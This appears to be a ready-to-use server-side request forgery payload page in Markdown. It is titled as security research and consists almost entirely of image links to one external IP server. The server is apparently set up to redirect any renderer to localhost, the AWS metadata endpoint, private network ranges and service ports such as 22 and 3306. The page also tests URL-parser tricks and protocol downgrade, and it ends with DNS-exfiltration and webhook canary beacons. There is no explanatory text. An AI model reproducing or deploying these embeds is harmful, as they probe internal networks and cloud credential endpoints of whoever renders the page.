# Security Research - v25

## Custom Server Redirect Testing (Fixed HTML)

Using standard `<img>` tags with your test server redirect endpoints.

---

### 1) Baseline - Direct Fetch
![t1-baseline](http://164.90.187.218:8080/ssrf-test-1-basic?nonce=v25-1)

---

### 2) Timeout Tests
![t2-slow-10s](http://164.90.187.218:8080/ssrf-test-7-slow?duration=10&nonce=v25-2)
![t3-slow-30s](http://164.90.187.218:8080/ssrf-test-7-slow?duration=30&nonce=v25-3)

---

### 3) Size Limits
![t4-large-10mb](http://164.90.187.218:8080/ssrf-test-6-large?size=10&nonce=v25-4)
![t5-large-50mb](http://164.90.187.218:8080/ssrf-test-6-large?size=50&nonce=v25-5)

---

### 4) External Redirect Tests
![t6-external-redirect](http://164.90.187.218:8080/ssrf-test-5-redirect?step=1&nonce=v25-6)

---

### 5) SSRF Redirect to Internal IPs

#### Localhost (127.0.0.1)
![t7-redir-localhost](http://164.90.187.218:8080/redirect-to-internal?case=localhost&nonce=v25-7)

#### AWS Metadata (169.254.169.254)
![t8-redir-metadata](http://164.90.187.218:8080/redirect-to-internal?case=metadata&nonce=v25-8)

#### RFC1918 - 10.x.x.x
![t9-redir-10](http://164.90.187.218:8080/redirect-to-internal?case=rfc1918-10&nonce=v25-9)

#### RFC1918 - 192.168.x.x
![t10-redir-192](http://164.90.187.218:8080/redirect-to-internal?case=rfc1918-192&nonce=v25-10)

#### RFC1918 - 172.16.x.x
![t11-redir-172](http://164.90.187.218:8080/redirect-to-internal?case=rfc1918-172&nonce=v25-11)

---

### 6) URL Parser Edge Cases

#### Userinfo Host Swap
![t12-userinfo](http://164.90.187.218:8080/redirect-to-edge?case=userinfo-host-swap&nonce=v25-12)

#### IPv6 Loopback
![t13-ipv6](http://164.90.187.218:8080/redirect-to-edge?case=ipv6-loopback&nonce=v25-13)

---

### 7) Port Scan via Redirect
![t14-port22](http://164.90.187.218:8080/redirect-to-port?port=22&nonce=v25-14)
![t15-port8443](http://164.90.187.218:8080/redirect-to-port?port=8443&nonce=v25-15)
![t16-port3306](http://164.90.187.218:8080/redirect-to-port?port=3306&nonce=v25-16)

---

### 8) Double Redirect
![t17-double](http://164.90.187.218:8080/double-redirect?first=external&second=localhost&nonce=v25-17)

---

### 9) Protocol Downgrade
![t18-proto-down](http://164.90.187.218:8080/redirect-protocol?from=https&to=http&target=127.0.0.1&nonce=v25-18)

---

### 10) DNS Exfil
![dns](https://v25-dns.371a7bef-c794-483b-8e77-3acbefb81362.dnshook.site/dns.gif)

### 11) Canary
![v25-canary](https://webhook.site/371a7bef-c794-483b-8e77-3acbefb81362/v25-canary.gif)

---

*v25 - Custom server redirect testing with standard img tags*
